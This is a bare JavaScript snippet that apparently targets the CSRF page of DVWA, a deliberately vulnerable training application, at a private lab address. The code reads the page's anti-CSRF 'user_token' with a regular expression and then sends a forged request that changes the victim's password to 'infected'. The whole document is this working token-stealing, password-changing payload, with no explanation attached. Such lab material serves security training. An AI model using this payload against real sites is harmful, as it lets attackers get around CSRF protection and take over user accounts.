var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/name='user_token' value='(.*?)'/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open("GET", "http://192.168.20.136/DVWA/vulnerabilities/csrf/?password_new=infected&password_conf=infected&Change=Change&user_token=" + token, true);
    changeReq.send();
};
req.open("GET", "http://192.168.20.136/DVWA/vulnerabilities/csrf/", true);
req.send();
